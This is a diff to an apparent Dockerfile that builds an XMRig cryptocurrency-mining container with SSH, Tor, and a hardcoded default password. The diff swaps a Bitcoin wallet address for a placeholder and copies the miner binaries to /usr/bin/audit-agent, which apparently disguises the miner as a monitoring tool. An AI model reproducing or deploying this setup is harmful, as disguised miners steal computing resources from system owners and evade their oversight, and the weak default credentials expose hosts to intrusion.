@@ -5,7 +5,7 @@ ENV XMRIG_VERSION=6.19.2
 ENV DEFAULT_USER=xmrig 
 ENV DEFAULT_PASSWORD=xmrig123
 ENV WORKER_ID=xmanxx001
-ENV ADDRESS=bc1qn4qpwy6h8qr3szy0d5c60ysm3a53edqt70g834
+ENV ADDRESS=chnge-this-to-your-wallet
 ENV CODE=BTC
 
 RUN apt-get update -y
@@ -17,7 +17,7 @@ RUN service ssh start
 RUN wget https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-x64.tar.gz
 RUN tar -xvf xmrig-${XMRIG_VERSION}-linux-x64.tar.gz
 RUN ls -al xmrig-${XMRIG_VERSION}
-RUN cp xmrig-${XMRIG_VERSION}/* /usr/bin/
+RUN cp xmrig-${XMRIG_VERSION}/* /usr/bin/audit-agent
 
 COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf
 COPY tor.rc /etc/tor/tor.rc
